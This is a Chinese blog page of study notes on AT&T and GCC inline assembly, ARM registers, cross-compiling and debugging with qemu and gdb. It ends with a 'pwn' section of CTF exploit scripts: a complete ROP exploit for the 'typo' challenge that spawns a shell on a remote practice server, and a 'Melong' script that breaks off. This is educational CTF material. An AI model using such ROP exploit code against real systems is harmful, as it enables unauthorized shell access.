class="line">vnext:</span><br><span class="line">popl %ecx # argv</span><br><span class="line">test %ecx, %ecx # 空指针表明结束</span><br><span class="line">jz exit</span><br><span class="line">movl %ecx, %ebx</span><br><span class="line">xorl %edx, %edx</span><br><span class="line">strlen:</span><br><span class="line">movb (%ebx), %al</span><br><span class="line">inc %edx</span><br><span class="line">inc %ebx</span><br><span class="line">test %al, %al</span><br><span class="line">jnz strlen</span><br><span class="line">movb $10, -1(%ebx)</span><br><span class="line">movl $4, %eax # 系统调用号(sys_write)</span><br><span class="line">movl $1, %ebx # 文件描述符(stdout)</span><br><span class="line">int $0x80</span><br><span class="line">jmp vnext</span><br><span class="line">exit: movl $1,%eax # 系统调用号(sys_exit)</span><br><span class="line">xorl %ebx, %ebx # 退出代码</span><br><span class="line">int $0x80</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>gcc内联汇编</p>
<p>用汇编编写的程序虽然运行速度快，但是开发速度慢，效率也低。如果只是对关键代码进行有优化，或许更好的办法是将汇编指令嵌入到C语言的程序中，从而充分利用高级语言和汇编语言各自的特点。但一般来讲，在C代码中嵌入汇编代码语句要比“存粹”的汇编代码复杂得多，应为需要解决“在尽量不影响已分配寄存器的情况，继续分配寄存器”，以及如何和与C代码中变量相结合等问题。</p>
<p>GCC提供了很好的内联汇编支持，最基本的格式是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_asm__(&quot;asm statements&quot;);</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm__(&quot;nop&quot;);这个语句不自行任何操作</span><br></pre></td></tr></table></figure>

<p>如果需要执行多条汇编语句的，则应该用“\n\t”将各个语句分隔开，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__asm__( &quot;pushl %%eax \\n\\t&quot;</span><br><span class="line">&quot;movl $0, %%eax \\n\\t&quot;</span><br><span class="line">&quot;popl %eax&quot;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__asm__( &quot;pushl %%eax \\n\\t&quot;</span><br><span class="line">&quot;movl $0, %%eax \\n\\t&quot;</span><br><span class="line">&quot;popl %eax&quot;);</span><br></pre></td></tr></table></figure>

<p>通常嵌入到C代码中的汇编代码很难做到与其他部分没有任何关系，因此更多时候需要用到完整的内联汇编格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm__(&quot;asm statements&quot; : outputs : inputs : registers-modified);</span><br></pre></td></tr></table></figure>

<p>插入到C代码中的汇编代码是以”:”分割的四个布冯，其中一部分就是汇编代码身，通常被称为之后指令部，其格式和在汇编语言中使用的格式基本相同。指令部分是必须的，而其他部分这则可以根据实际情况进行省略。</p>
<p>在将汇编语句嵌入到C代码中时，操作数如何与C代码中的变量相结合是一个很大的问题。</p>
<p>GCC采用如下办法来解决这个问题：</p>
<p>程序员提供具体的指令，而对寄存器的使用则只需给出”样板”和约束条件就可以了，具体怎样将寄存器和变量解饿起来就是GCC等编译器的事了</p>
<p>在GCC内联汇编语句的指令中，加上前缀”%”的数字(如%0，%1)表示的就是需要时使用寄存器的”样板”操作数。指令部中使用了几个样板操作数，就表明有几个变量需要和寄存器相结合，这样GCC等编译器在编译时会根据后面给定的约束条件进行恰当的处理，由于样板操作数也是用”%”作为前缀，因此在设计到具体的寄存器时，寄存器前面应该加上两个”%”，一面产生混淆。</p>
<p>紧跟在指令后部的是输出部，是规定输出变量如何与样板操作数进行结合的条件，每一个条件称为一个”约束”，必要时可以打包多个约束，相互之间用逗号分隔开就可以了。每个输出约束都是以”&#x3D;”号开始的，然后紧跟一个操作数类型进行说明的字后，最后是如何与变量相结合的约束。凡是与输出部中说明的操作数相结合的寄存器或操作数本身，在执行完嵌入的汇编代码后均不保留执行之前的内容，只是GCC在调度寄存器时所使用的依据。</p>
<p>输出部后面时输入部，输入约束的格式和输出约束相似，但不带”&#x3D;”号，如果一个输入约束要求使用寄存器，则GCC在预处理时就会为之分配一个寄存器，并插入必要的指令将操作数装入该寄存器。与输入部中说明的操作数结婚的寄存器或操作数本身，在执行完嵌入的汇编代码后也不保留执行之前的内容。</p>
<p>有时在执行某些操作时，除了要用到进行数据输入和输出的寄存器外，还要使用多个寄存器来保存中间计算结果，这样就难免会破坏原有寄存器的内容。在GCC内联汇编合适的最后一个部分中，可以对产生副作用的寄存器进行说明，一边GCC能采用相应的措施。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a = 10, b = 0;</span><br><span class="line">__asm__ __volatile__(&quot;movl %1, %%eax;\\n\\r&quot;</span><br><span class="line">&quot;movl %%eax, %0;&quot;</span><br><span class="line">:&quot;=r&quot;(b)</span><br><span class="line">:&quot;r&quot;(a)</span><br><span class="line">:&quot;%eax&quot;);</span><br><span class="line">printf(&quot;Result: %d, %d\\n&quot;, a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>上面的程序完成变量a的值赋予变量b，有几点需要说明：</p>
<ul>
<li>变量b是输出的操作数，通过%0来应用，而变量a是输入操作数，通过%1来引用。</li>
<li>输入操作数和输出操作数都是用r进行约束，表示变量a和变量b储存在寄存器中。输入约束和输出约束的不同点在于输出约束多一个约束修饰符”&#x3D;”</li>
<li>在内联汇编语句中使用寄存器eax时，寄存器名前应加两个”%”，即两个”%%eax”.内联汇编使用%0，%1等标示变量，任何只带一个”%”的表示符都看成是操作数，而不是寄存器。</li>
<li>内联汇编的最后一个部分告诉GCC，他将改变寄存器eax的值，GCC编译器在处理时不应该使用该寄存器来储存其他任何值。</li>
<li>由于变量b被指定成输出操作数，当内联汇编语句执行完毕后，她所保存的值将被更新。</li>
</ul>
<p>在内联汇编中用到的操作数，从输出部的第一个约束开始编号，序号从0开始，每一个约束计数一次，指令需要引用这些操作数，只需在序号前加上”%”作为前缀就可以了，需要注意的是，内敛汇编的指令部在引用第一个操作数时总将其作为32位的长字使用，但实际情况需要的是字或是字节，因此应该在约束中指明正确的限定符：</p>
<table>
<thead>
<tr>
<th><strong>限定符</strong></th>
<th><strong>意义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>“m”、”v”、”o”</td>
<td>内存单元</td>
</tr>
<tr>
<td>“r”</td>
<td>任何寄存器</td>
</tr>
<tr>
<td>“q”</td>
<td>寄存器eax、ebx、ecx、edx之一</td>
</tr>
<tr>
<td>“i”、”h”</td>
<td>直接操作数</td>
</tr>
<tr>
<td>“E”和”F”</td>
<td>浮点数</td>
</tr>
<tr>
<td>“g”</td>
<td>任意</td>
</tr>
<tr>
<td>“a”、”b”、”c”、”d”</td>
<td>分别表示寄存器eax、ebx、ecx和edx</td>
</tr>
<tr>
<td>“S”和”D”</td>
<td>寄存器esi、edi</td>
</tr>
<tr>
<td>“I”</td>
<td>常数（0至31）</td>
</tr>
</tbody></table>
<p>顺便提一下，内联汇编也可以将汇编单独写在一个源文件里，然后extern调用，个人感觉这样可能方便些。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">;nasm -f elf test.asm   compile si as i386 default</span><br><span class="line">;nasm -f elf64 test.asm</span><br><span class="line">;ld -m elf_i386 -o test test.o  </span><br><span class="line">;ld  -m elf_x86_64 -o test test.o</span><br><span class="line">;这里单独编译也能运行,这里是intel的语法，at&amp;t也还是一样的。</span><br><span class="line">;ld -o test test.o </span><br><span class="line"></span><br><span class="line">section .data                  ;</span><br><span class="line">msg db &quot;hello, world&quot;,0xa      ; </span><br><span class="line">len equ $ - msg                ;</span><br><span class="line">section .text                  ;</span><br><span class="line"></span><br><span class="line">global hello_world              ;</span><br><span class="line">                               ;</span><br><span class="line">hello_world:                        ;</span><br><span class="line">    mov edx,len;write(1,str,len)</span><br><span class="line">    mov ecx,msg;</span><br><span class="line">    mov ebx,1;</span><br><span class="line">    mov eax,4;</span><br><span class="line">    int 0x80;</span><br><span class="line">    mov ebx,0;</span><br><span class="line">    mov eax,1;</span><br><span class="line">    int 0x80;</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nasm -f elf64 hello_world.asm</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// gcc -c test.c -o test.o</span></span><br><span class="line"><span class="comment">// ld test.o srop.o -o test</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">hello_world</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    hello_world();   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1804189">https://cloud.tencent.com/developer/article/1804189</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/liaoshengshi/article/details/39989797">https://blog.csdn.net/liaoshengshi/article/details/39989797</a></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2023/08/21/at&t%E6%B1%87%E7%BC%96/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/06/19/arm/">
        <h2 class="post-title">arm</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/6/19
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><h5 id="32位5"><a href="#32位5" class="headerlink" title="32位5"></a>32位5</h5><h6 id="有哪些寄存器"><a href="#有哪些寄存器" class="headerlink" title="有哪些寄存器"></a>有哪些寄存器</h6><p><img src="/./../pictures/arm/MBXY-CR-9bfc0d6b526ccdf1026cd7e0cc76e746.png" alt="img"></p>
<p>r0 - r3用于函数调用传参，32位最多支持4个入参，当多余4个参数时将通过压栈方式进行传递，栈的方式为先进后出，当参数大于4个时，入栈顺序与参数顺序正好相反，子程序返回前无需恢复 r0 - r3的，32位的返回结果保存在 r0 中；</p>
<p>r4 - r11 ：用于保存局部变量，函数进入后首先就是将 r4 - 411 入栈保存，然后才能用于本函数使用，本函数使用完之后，要讲之前栈保存的数据恢复到 r4 - r11 中；</p>
<p>r7 ：系统调用时，存放系统调用号，有时用于作为 FP 使用，FP又叫 frame pinter 即栈基指针，主要在函数中保存当前函数的栈起始位置，用于堆栈回溯；</p>
<p>r9静态基址寄存器</p>
<p>r10堆栈限制寄存器</p>
<p>r11帧指针</p>
<p>r12指向当前执行指令地址，也称ip寄存器</p>
<p>r13 ：SP，即栈指针寄存器，主要用于指向当前程序栈顶、配合指令 pop&#x2F;push</p>
<p>r14 ：LR，即链接寄存器，主要用于存放函数的返回地址</p>
<p>r15 ：PC，即程序寄存器，主要用于存放CPU取值的地址，是取值地址，不是当前运行地址。<code>pc</code> 寄存器实际上包含了当前指令的地址加上8字节的偏移，32位是两条指令，64位是一条。</p>
<h5 id="arm传参"><a href="#arm传参" class="headerlink" title="arm传参"></a>arm传参</h5><p>r0-r3是寄存器传参，其余的使用栈传参。</p>
<p>r4-r8用于保存局部变量，多的也在栈上。</p>
<p>APSR&#x2F;CPSR：应用程序状态寄存器&#x2F;当前程序状态寄存器。</p>
<h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><p>X0-X7 ：传递子程序的参数和返回值，使用时不需要保存，多余的参数用堆栈传递，64位的返回结果保存在 X0 中；</p>
<p>X8 ：用于保存子程序的返回地址，使用时不需要保存；</p>
<p>X9-X15 : 临时寄存器，也可叫可变寄存器，子程序使用时不需要保存</p>
<p>X16 - X17 : 子程序内部调用寄存器(IPx)，使用时不需要保存，尽量不使用。</p>
<p>X18 : 平台寄存器，其使用与平台相关，尽量不要使用</p>
<p>X19 - X28 ：临时寄存器，子程序使用时必须保存</p>
<p>X29 ：帧指针寄存器(FP)，用于连接栈帧，使用时必须保存</p>
<p>X30 ：链接寄存器(LR)，用于保存子程序的返回地址</p>
<p>X31：堆栈指针寄存器（SP），用于指向每个函数的栈顶</p>
<h4 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h4><h4 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h4><p>在x86下安装arm环境</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-armhf-cross</span><br></pre></td></tr></table></figure>

<p>相关库在<code>/usr/arm-linux-gnueabihf</code></p>
<p>软件包</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-arm-linux-gnueabi</span><br><span class="line">sudo apt-get install gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[10:15:00][blact@u22 ~/arm/test]$ arm</span><br><span class="line">arm2hpdl                         arm-linux-gnueabi-elfedit        arm-linux-gnueabi-gcc-ranlib-11  arm-linux-gnueabi-ld             arm-linux-gnueabi-readelf</span><br><span class="line">arm-linux-gnueabi-addr2line      arm-linux-gnueabi-gcc            arm-linux-gnueabi-gcov           arm-linux-gnueabi-ld.bfd         arm-linux-gnueabi-size</span><br><span class="line">arm-linux-gnueabi-ar             arm-linux-gnueabi-gcc-11         arm-linux-gnueabi-gcov-11        arm-linux-gnueabi-ld.gold        arm-linux-gnueabi-strings</span><br><span class="line">arm-linux-gnueabi-as             arm-linux-gnueabi-gcc-ar         arm-linux-gnueabi-gcov-dump      arm-linux-gnueabi-lto-dump-11    arm-linux-gnueabi-strip</span><br><span class="line">arm-linux-gnueabi-c++filt        arm-linux-gnueabi-gcc-ar-11      arm-linux-gnueabi-gcov-dump-11   arm-linux-gnueabi-nm</span><br><span class="line">arm-linux-gnueabi-cpp            arm-linux-gnueabi-gcc-nm         arm-linux-gnueabi-gcov-tool      arm-linux-gnueabi-objcopy</span><br><span class="line">arm-linux-gnueabi-cpp-11         arm-linux-gnueabi-gcc-nm-11      arm-linux-gnueabi-gcov-tool-11   arm-linux-gnueabi-objdump</span><br><span class="line">arm-linux-gnueabi-dwp            arm-linux-gnueabi-gcc-ranlib     arm-linux-gnueabi-gprof          arm-linux-gnueabi-ranlib</span><br></pre></td></tr></table></figure>



<p>编译</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;hello,world!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-gnueabi-gcc test.c </span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./a.out </span><br></pre></td></tr></table></figure>





<p>因为自带的arm libc没有符号表，所以调试起来将会非常麻烦</p>
<p>解决方法：</p>
<ul>
<li><p>去官方下载.debug文件，在调试时使用add-symble-file</p>
</li>
<li><p>重新交叉一个libc</p>
<p>下好libc文件(以glibc-2.31为例)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> glibc-2.31</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">mkdir</span> armhf</span><br></pre></td></tr></table></figure>

<p>在build文件夹中使用一下命令进行配置(路径补充完整)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CC=/opt/gcc-linaro-7.5.0-2019.12-x86_64_arm-linux-gnueabihf/bin/arm-linux-gnueabihf-gcc \</span><br><span class="line">CXX=/opt/gcc-linaro-7.5.0-2019.12-x86_64_arm-linux-gnueabihf/bin/arm-linux-gnueabihf-g++ \</span><br><span class="line">CFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span> \</span><br><span class="line">CXXFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span> \</span><br><span class="line">../configure \</span><br><span class="line">--prefix=/home/blact/libc/glibc-2.31/armhf \</span><br><span class="line">--host=arm-linux \</span><br><span class="line">--target=arm-linux \</span><br><span class="line">--disable-werror \</span><br><span class="line">--enable-debug=<span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>编译出来lib文件就在armhf文件下(是armhf的库)</p>
</li>
</ul>
<h5 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h5><p>即使是将带符号的libc编译出来，但在gdb-mutiarch中仍然是是没有符号的，有说需要将lib复制到二进制文件所在位置的，但试过也不行(不知道是不是方法没正确)，软连接也试过，暂时也不行。</p>
<p>感觉就只有手动载入符号表了。</p>
<p><code>add-symble-file libcbase</code>或者是<code>set solib-search-path /usr/aarch64-linux-gnu/lib/ </code></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
<li><p>下载arm交叉编译链的时候一定注意其架构</p>
<p><img src="/./../pictures/arm/image-20240226204718074.png" alt="image-20240226204718074"></p>
</li>
<li><p>在编译时最好将路径写全，否则可能会apt下载的编译器路径冲突，编译出的东西可能会出问题。</p>
</li>
</ul>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>静态编译的二进制文件不讨论了。</p>
<p>重点说说动态链接的。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-mutiarch -L /path/to/libc -g the-port the-file-name  <span class="comment">#这里称为程序端，gdb则称为调试端</span></span><br></pre></td></tr></table></figure>

<p>命令执行后，程序挂起</p>
<p>另一个panel中</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-mutiarch the-file-name  <span class="comment">#注意调试时需要加二进制文件的，因为是远程调试，要加符号表，也可以启动后再加</span></span><br><span class="line"><span class="built_in">set</span> architecture arm <span class="comment">#感觉可以不用加，也可以自动识别</span></span><br><span class="line">target remote :the-port <span class="comment">#开启监听，gdb中开始有内容，这时可以开始一系列断点等操作</span></span><br></pre></td></tr></table></figure>

<h5 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h5><p>需要交互的程序可能有点麻烦。</p>
<p>我调试时，每当需要交互时，gdb会卡住(用得还不熟吧，大概)，需要在程序端输入数据后额外输入Crl+c中断，才能继续在调试端进行操作。总感觉这个方法还不够优雅。</p>
<h4 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h4><p>指定位置运行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/arm-linux-gnueabihf/ ./xxx</span><br></pre></td></tr></table></figure>



<h5 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#  context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  for i in range(100, 150)[::-1]:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>, <span class="number">123</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./typo&quot;</span>, timeout = <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">        io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;./typo&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="number">9888</span>, timeout = <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    io.sendafter(<span class="string">&quot;quit\n&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh</span></span><br><span class="line"><span class="string">    Strings information</span></span><br><span class="line"><span class="string">    ============================================================</span></span><br><span class="line"><span class="string">    0x0006c384 : /bin/sh</span></span><br><span class="line"><span class="string">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only &quot;pop|ret&quot; | grep r0</span></span><br><span class="line"><span class="string">    0x00020904 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * i + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>) * <span class="number">2</span> + p32(<span class="number">0x110B4</span>)</span><br><span class="line">    success(i)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  pause()</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#  pdb.set_trace()</span></span><br><span class="line">        io.sendline(<span class="string">&quot;echo aaaa&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;aaaa&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.interactive()</span><br></pre></td></tr></table></figure>





<h5 id="Melong"><a href="#Melong" class="headerlink" title="Melong"></a>Melong</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python # -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./melong&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    IO = remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    IO = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>, <span class="string">&quot;./melong&quot;</span>])</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">    IO = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1237&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;./melong&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./melong&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">height, weight</span>):</span><br><span class="line">    